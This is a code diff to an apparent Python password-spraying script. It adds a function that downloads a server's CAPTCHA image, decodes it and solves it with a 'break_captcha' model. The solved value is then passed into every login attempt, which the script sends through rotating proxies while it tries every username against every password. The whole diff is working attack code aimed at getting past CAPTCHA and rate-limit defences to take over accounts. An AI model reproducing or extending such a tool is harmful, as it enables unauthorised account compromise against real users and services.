@@ -6,6 +6,11 @@ import time
 import threading
 from dotenv import load_dotenv
 load_dotenv()
+from break_captcha import break_captcha
+import base64
+from PIL import Image
+import io
+
 
 # Lock for synchronized output
 # print_lock = threading.Lock()
@@ -126,7 +131,44 @@ def delete_proxy_in_constant_time(proxy):
 max_retries = 3
 proxies_lock = threading.Lock()
 
-def rotating_proxy(username, password):
+def get_and_break_captcha():
+    try:
+        response = requests.get(url)  
+    except requests.RequestException as e:
+        print(f"Failed to fetch CAPTCHA data: {e}")
+        return None
+
+    captcha_data = response.json().get("captchaImage")
+    if not captcha_data:
+        print("No CAPTCHA data found in server response.")
+        return None
+
+    try:
+        captcha_image_binary = base64.b64decode(captcha_data)
+    except base64.binascii.Error as e:
+        print(f"Failed to decode CAPTCHA base64 data: {e}")
+        return None
+
+    try:
+        captcha_image = Image.open(io.BytesIO(captcha_image_binary))
+        captcha_image.save("captcha.jpg")  
+    except IOError as e:
+        print(f"Failed to rebuild CAPTCHA image: {e}")
+        return None
+
+    try:
+        predicted_text = break_captcha("captcha.jpg") 
+        return predicted_text
+    except Exception as e:
+        print(f"Failed to predict CAPTCHA: {e}")
+        return None
+    # get request to server
+    # image = rebuild captcha image from server
+    # predicted_text = break_captcha(image)
+    # return predicted_text
+
+
+def rotating_proxy(username, password, captcha_value):
     global proxies_list
     retry_count = 0
 
@@ -142,7 +184,7 @@ def rotating_proxy(username, password):
             login_response = session.post(
                 url,
                 proxies=proxies,
-                json={"username": username, "password": password}
+                json={"username": username, "password": password, "captchaValue": captcha_value}
             )
 
             # Handle response codes
@@ -186,7 +228,8 @@ def password_spray(usernames, passwords):
         # Iterate through each username and try each password
         for username in usernames:
             for password in passwords:
-                executor.submit(rotating_proxy, username, password)
+                captcha_value = get_and_break_captcha()
+                executor.submit(rotating_proxy, username, password, captcha_value)
 
 # Run the password spray
 if __name__ == "__main__":
